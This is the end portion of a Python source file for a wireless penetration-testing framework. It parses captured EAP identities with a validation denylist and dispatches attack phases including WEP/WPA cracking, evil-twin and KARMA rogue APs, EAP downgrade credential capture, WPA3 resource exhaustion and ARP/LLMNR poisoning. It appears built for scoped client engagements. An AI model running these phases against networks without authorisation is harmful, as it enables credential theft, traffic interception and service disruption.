    re.compile(r"\bWARNING\b|\bERROR\b|\bDEBUG\b|\bINFO\b", re.IGNORECASE),
    re.compile(r"rlm_\w+:", re.IGNORECASE),
    re.compile(r"could be dangerous", re.IGNORECASE),
)


def _is_valid_eap_identity(ident: str) -> tuple:
    """Validate an EAP-Response/Identity value against RFC 4282 NAI shape.

    Returns (is_valid: bool, reject_reason: str).  Valid identities are
    1-253 chars, contain only printable ASCII (0x21-0x7E — explicitly no
    whitespace, no quotes), and do not match any known FreeRADIUS /
    hostapd-wpe diagnostic-string pattern.

    Empty string is treated as valid (legitimate anonymous identity).
    """
    if ident == "":
        return True, ""   # valid anonymous
    if not ident:
        return False, "empty/null"
    if len(ident) > 253:
        return False, f"length {len(ident)} > 253 (RFC 4282)"
    # Reject if any char is outside printable ASCII (excludes 0x20 space,
    # excludes 0x7F DEL, excludes all control chars).  Real identities
    # never contain whitespace per RFC 4282.
    for c in ident:
        cp = ord(c)
        if cp < 0x21 or cp > 0x7E:
            return False, f"non-NAI character (codepoint 0x{cp:02X}) at offset {ident.index(c)}"
    # Quotes inside identities are technically allowed by RFC 4282 §2.5
    # but vanishingly rare in practice and the artifact we're filtering
    # against contains double quotes verbatim.  Reject defensively.
    if '"' in ident or "'" in ident:
        return False, "contains quote character (RFC 4282 §2.5 — improbable in practice)"
    for rx in _EAP_IDENTITY_DIAGNOSTIC_DENYLIST:
        if rx.search(ident):
            return False, f"matches diagnostic-string denylist pattern: {rx.pattern!r}"
    return True, ""


def phase_eaptls_identity_analysis(output_dir: Path, timeout: int = 30) -> None:
    """Parse captured EAPOL frames for EAP-Response/Identity messages and
    flag any that leak username@realm (rather than anonymous@realm).

    Filters identities through _is_valid_eap_identity() to reject content
    that tshark extracted from malformed/synthetic frames (notably
    FreeRADIUS / hostapd-wpe diagnostic strings that have been observed
    bleeding into the eap.identity field).  Rejected identities are
    logged to eap_identities_rejected.json so the operator can audit
    false-positive filtering if a legitimate identity is suppressed."""
    _check_pause()
    status("p_eaptls_id", "Phase 0-VII: EAP-TLS Identity Disclosure Analysis",
           "running")
    log("[0-VII] START: EAP-TLS Identity Disclosure — parsing EAPOL frames for leaked identities")
    id_dir = output_dir / "eap_identity"
    id_dir.mkdir(exist_ok=True)

    pcap_paths: list = []
    for ext in ("*.cap", "*.pcap", "*.pcapng"):
        pcap_paths.extend(output_dir.rglob(ext))
    if not pcap_paths or not shutil.which("tshark"):
        status("p_eaptls_id", "Phase 0-VII: EAP-TLS Identity Disclosure Analysis",
               "complete", "no captures or tshark missing")
        return

    raw_identities: list = []
    for pcap in pcap_paths:
        try:
            out, rc = _run([
                "tshark", "-r", str(pcap),
                "-Y", "eap.code == 2 and eap.identity",
                "-T", "fields", "-e", "eap.identity",
            ], timeout=timeout)
            if rc == 0 and out.strip():
                for line in out.strip().splitlines():
                    ident = line.strip()
                    if ident and ident not in raw_identities:
                        raw_identities.append(ident)
        except Exception:
            pass

    identities: list = []
    rejected: list = []
    for ident in raw_identities:
        valid, reason = _is_valid_eap_identity(ident)
        if valid:
            identities.append(ident)
        else:
            rejected.append({"identity": ident, "reason": reason})
            log(f"  [eap-id] rejected: {reason} — {ident[:60]!r}"
                + ("…" if len(ident) > 60 else ""))

    for ident in identities:
        is_anon = (ident.lower().startswith("anonymous@") or
                   ident == "anonymous" or ident.startswith("@"))
        finding_from_cat("AETHER-INFO-EAP-IDENTITY",
                         data={"identity": ident, "is_anonymous": is_anon},
                         title_override=f"EAP outer Identity observed: {ident!r}")
        if not is_anon and "@" in ident:
            finding_from_cat("AETHER-EAPTLS-001",
                             data={"identity": ident, "username": ident.split("@")[0],
                                   "realm": ident.split("@")[1]},
                             title_override=f"EAP outer Identity leaks user-realm format: "
                                            f"{ident!r}")

    (id_dir / "eap_identities.json").write_text(
        json.dumps({"identities": identities}, indent=2), encoding="utf-8")
    if rejected:
        (id_dir / "eap_identities_rejected.json").write_text(
            json.dumps({"rejected": rejected,
                        "note": "Filtered by _is_valid_eap_identity(); see "
                                "_EAP_IDENTITY_DIAGNOSTIC_DENYLIST and RFC 4282 "
                                "NAI shape rules in aether.py."}, indent=2),
            encoding="utf-8")
    log(f"[0-VII] END: EAP-TLS Identity — {len(identities)} identities observed"
        + (f", {len(rejected)} rejected as artifacts" if rejected else ""))
    status("p_eaptls_id", "Phase 0-VII: EAP-TLS Identity Disclosure Analysis",
           "complete",
           f"{len(identities)} identities observed"
           + (f", {len(rejected)} rejected as artifacts" if rejected else ""))


def main():
    args = parse_args()
    _start_oom_watchdog()

    if args.list_phases:
        print("Available phases:")
        print("  wep           — Phase 0:  WEP IV capture + PTW crack         (aircrack-ng)")
        print("  pmkid         — Phase 1a: Clientless PMKID + hashcat          (hcxdumptool)")
        print("  wpa           — Phase 1b: WPA handshake + WPS attacks         (wifite2)")
        print("  enterprise    — Phase 2:  WPA-Enterprise rogue AP + asleap    (EAPHammer)")
        print("  wpa3          — Phase 3:  WPA3 SAE crypto testing             (dragonslayer)")
        print("  drain         — Phase 4:  WPA3 resource exhaustion            (dragondrain)")
        print("  krack         — Phase 5:  WPA2 KRACK testing                 (krackattacks)")
        print("  rogue         — Phase 6a: Rogue AP / Evil Twin + PSK portal   (hostapd+dnsmasq)")
        print("  karma         — Phase 6b: KARMA / MANA probe response         (hostapd-mana)")
        print("  mana-loud     — Phase 6c: MANA loud-mode beacon spam          (hostapd-mana)")
        print("  pmkid-roam    — Phase 1c: PMKID capture during FT roam events (hcxdumptool)")
        print("  eap-fast      — Phase 8b: EAP-FAST anonymous PAC provisioning (EAPHammer)")
        print("  client        — Phase 7:  PMF test + BTM hijack + probe harvest(scapy)")
        print("  eap-downgrade — Phase 8:  EAP downgrade credential capture    (EAPHammer)")
        print("  sae-downgrade — Phase 9:  SAE transition mode downgrade       (hostapd)")
        print("  post          — Phase 10: ARP poison + LLMNR/NBT-NS + portscan(responder+nmap)")
        print("  legacy        — Phase 11: TKIP ChopChop + Wi-Fi Direct + captive bypass")
        sys.exit(0)

    _startup_tool_check()
    _init_fdb()

    config_path = Path(args.config)
    if not config_path.exists():
        print(f"[!] Config not found: {config_path}", file=sys.stderr)
        sys.exit(1)
    try:
        config = json.loads(config_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as exc:
        print(f"[!] Config parse error: {exc}", file=sys.stderr)
        sys.exit(1)

    # Resolve project directory: CLI arg → absolute; relative → under clients_base;
    # omitted → structured path from config's client_short and start_date fields.
    import re as _re
    if args.project:
        _proj_p = Path(args.project)
        args.project = str(_proj_p if _proj_p.is_absolute() else _clients_base() / _proj_p)
    else:
        _cs = (config.get("client_short") or "").strip()
        _sd = (config.get("start_date") or "").strip()
        # Use tool-specific name from TOOLS registry if this is a variant (aether-z, etc.)
        _tool_key = os.environ.get("CRUCIBLE_TOOL_ID", "aether")
        args.project = str(_build_project_dir(_cs, _sd, _tool_key))
    # Announce the resolved project dir so the operator can see exactly where
    # this run is writing — quiet defaults to a wrong slug were the symptom that
    # produced "/clients/client/2026/aether/" clutter on Linux benches.
    print(f"[Aether v{VERSION}] Project directory: {args.project}", flush=True)
    _write_project_meta(
        Path(args.project),
        tool=os.environ.get("CRUCIBLE_TOOL_ID", "aether"),
        client_name=(config.get("client_name") or ""),
        client_short=(config.get("client_short") or ""),
        year=((config.get("start_date") or "")[:4] or datetime.now().strftime("%Y")),
        version=VERSION,
    )
    # Dual-write universal meta.json (schema 1.0) for Prometheus UniversalParser.
    _u_dual_write_meta(
        Path(args.project),
        tool="aether", version=VERSION,
        client_short=(config.get("client_short") or ""),
        client_name=(config.get("client_name") or ""),
        engagement_name=(config.get("engagement_name") or ""),
        target=(config.get("ssid") or config.get("interface") or
                str(config.get("targets") or "")),
    )
    try:
        import pr0t31n_dep_snapshot as _ds
        _ds.write_snapshot(
            Path(args.project), "aether", VERSION,
            binaries=["aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng", "reaver", "wash", "hcxdumptool", "hcxpcapngtool", "hashcat", "asleap", "wifite", "hostapd", "dnsmasq", "nmap", "mdk4", "responder", "bettercap"],
            pip_packages=[],
        )
    except Exception:
        pass

    global _log_fh, _RUNLOG
    try:
        _log_fh = open(Path(args.project) / "aether_console.log", "a", encoding="utf-8")
        _log_fh.write(f"# Aether v{VERSION} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        _log_fh.flush()
    except Exception:
        _log_fh = None
    # §13b/§14j/§14k: canonical audit log + own-version startup EVENT.
    if _el is not None:
        try:
            _RUNLOG = _el.EventLogger(Path(args.project) / "scan.log",
                                       errors_path=Path(args.project) / "errors.log")
            _RUNLOG.event(f"Aether v{VERSION} started")
        except Exception:
            _RUNLOG = None

    global _PAUSE
    if _pp is not None:
        _PAUSE = _pp.PauseManager(args.project, "aether")
        _PAUSE.start_watcher(checkpoint_callback=lambda: _save_checkpoint(args.project), grace_period=30)
        _resumed = os.environ.get("CRUCIBLE_RESUME") == "1"
        _PAUSE.log_run_type(resumed=_resumed)
        if _resumed:
            _PAUSE.cleanup_incomplete()

    if args.interface:
        config["interface"] = args.interface
    if args.ssids:
        config["target_ssids"] = args.ssids
    if args.bssids:
        config["target_bssids"] = args.bssids
    if args.channel is not None:
        config["scan_channel"] = args.channel
    if args.timeout is not None:
        config["timeout_per_phase"] = args.timeout
    if args.wordlists:
        # Multiple --wordlist flags → list in config; single → string for backward compat
        config["wordlist"] = (args.wordlists if len(args.wordlists) > 1
                              else args.wordlists[0])
    if args.scope_bssids:
        config.setdefault("scope", {})["bssids"] = args.scope_bssids
    if args.scope_ssids:
        config.setdefault("scope", {})["ssids"] = args.scope_ssids
    if args.scope_active_ssids:
        modes = config.setdefault("scope", {}).setdefault("modes", {})
        for s in args.scope_active_ssids:
            modes[s] = "active"
    if args.scope_passive_ssids:
        modes = config.setdefault("scope", {}).setdefault("modes", {})
        for s in args.scope_passive_ssids:
            modes[s] = "passive"
    if args.scope_default_mode:
        config.setdefault("scope", {})["default_mode"] = args.scope_default_mode
    if args.domains:
        config["domains"] = args.domains
    if args.hashcat_rules:
        config["hashcat_rules"] = args.hashcat_rules

    if args.phase:
        _phase_map = {
            "wep":            "wep",
            "pmkid":          "pmkid",
            "wpa":            "wpa_handshake",
            "enterprise":     "wpa_enterprise",
            "wpa3":           "dragonblood_sae",
            "drain":          "dragonblood_drain",
            "krack":          "krack",
            "rogue":          "rogue_ap",
            "karma":          "karma",
            "mana-loud":      "mana_loud",
            "pmkid-roam":     "pmkid_roam",
            "eap-fast":       "eap_fast_anon",
            "client":         "client_attacks",
            "eap-downgrade":  "eap_downgrade",
            "sae-downgrade":  "sae_downgrade",
            "post":           "post_connection",
            "legacy":         "legacy_attacks",
        }
        _all_keys = [
            "wep", "pmkid", "pmkid_roam", "wpa_handshake", "wpa_enterprise",
            "dragonblood_sae", "dragonblood_drain", "krack",
            "rogue_ap", "karma", "mana_loud", "client_attacks", "eap_downgrade",
            "eap_fast_anon", "sae_downgrade", "post_connection", "legacy_attacks",
        ]
        config["phases"] = {k: (k == _phase_map[args.phase]) for k in _all_keys}

    _load_catalogue()
    run(config, args.project)


_load_catalogue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Assessment interrupted by operator.")
        sys.exit(0)
